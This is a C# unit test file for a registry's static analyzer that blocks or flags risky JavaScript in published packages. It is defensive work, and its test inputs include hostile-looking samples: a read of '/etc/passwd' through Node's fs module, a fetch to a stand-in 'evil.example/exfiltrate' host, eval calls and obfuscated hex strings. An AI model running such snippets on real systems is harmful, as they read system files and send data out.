using Forge.Api.Features.Registry.Publishing;
using Xunit;

namespace Forge.Tests.Features.Registry.Publishing;

public sealed class StaticAnalyzerTests
{
    private static readonly IReadOnlySet<string> NoAllowlist = new HashSet<string>();

    [Fact]
    public void Ordinary_Code_Is_Clean()
    {
        var report = StaticAnalyzer.Analyze("function add(a, b) { return a + b; } export { add };", NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Clean, report.Verdict);
        Assert.Empty(report.Findings);
    }

    [Theory]
    [InlineData("eval('doSomethingBad()');")]
    [InlineData("window.eval(userInput);")] // still a real eval call even when qualified.
    public void Eval_Is_Blocked(string source)
    {
        var report = StaticAnalyzer.Analyze(source, NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Blocked, report.Verdict);
        Assert.Contains(report.Findings, f => f.Rule == "eval-call");
    }

    [Fact]
    public void A_Property_Named_Eval_Is_Not_Flagged()
    {
        // config.eval(...) is a real method call on some *other* object,
        // not the free eval() this rule exists to catch — the pattern
        // specifically excludes a preceding '.' for this reason.
        var report = StaticAnalyzer.Analyze("config.eval(x);", NoAllowlist);
        Assert.DoesNotContain(report.Findings, f => f.Rule == "eval-call");
    }

    [Theory]
    [InlineData("new Function('return 1')();")]
    [InlineData("const f = Function(\"a\", \"return a\");")]
    public void Dynamic_Function_Construction_Is_Blocked(string source)
    {
        var report = StaticAnalyzer.Analyze(source, NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Blocked, report.Verdict);
        Assert.Contains(report.Findings, f => f.Rule == "function-constructor");
    }

    [Fact]
    public void Node_Builtin_Escape_Attempts_Are_Blocked()
    {
        var report = StaticAnalyzer.Analyze("const fs = require('fs'); fs.readFileSync('/etc/passwd');", NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Blocked, report.Verdict);
        Assert.Contains(report.Findings, f => f.Rule == "node-builtin-escape");
    }

    [Fact]
    public void A_Network_Call_To_An_Allowlisted_Domain_Is_Clean()
    {
        var allowlist = new HashSet<string> { "api.weather.example" };
        var report = StaticAnalyzer.Analyze("fetch(\"https://api.weather.example/forecast\");", allowlist);
        Assert.Equal(StaticAnalysisVerdict.Clean, report.Verdict);
    }

    [Fact]
    public void A_Network_Call_To_A_Non_Allowlisted_Domain_Is_Blocked()
    {
        var report = StaticAnalyzer.Analyze("fetch(\"https://evil.example/exfiltrate\");", NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Blocked, report.Verdict);
        Assert.Contains(report.Findings, f => f.Rule == "network-allowlist-violation");
    }

    [Fact]
    public void A_High_Density_Of_Hex_Escapes_Is_Flagged_Not_Blocked()
    {
        var obfuscated = string.Concat(Enumerable.Repeat(@"\x41\x42\x43", 50));
        var report = StaticAnalyzer.Analyze(obfuscated, NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Flagged, report.Verdict);
        Assert.Contains(report.Findings, f => f.Rule == "obfuscation-heuristic");
    }

    [Fact]
    public void A_Blocked_Finding_Outranks_A_Flagged_One_In_The_Overall_Verdict()
    {
        var obfuscated = string.Concat(Enumerable.Repeat(@"\x41\x42\x43", 50));
        var source = "eval('x');" + obfuscated;
        var report = StaticAnalyzer.Analyze(source, NoAllowlist);
        Assert.Equal(StaticAnalysisVerdict.Blocked, report.Verdict);
    }
}
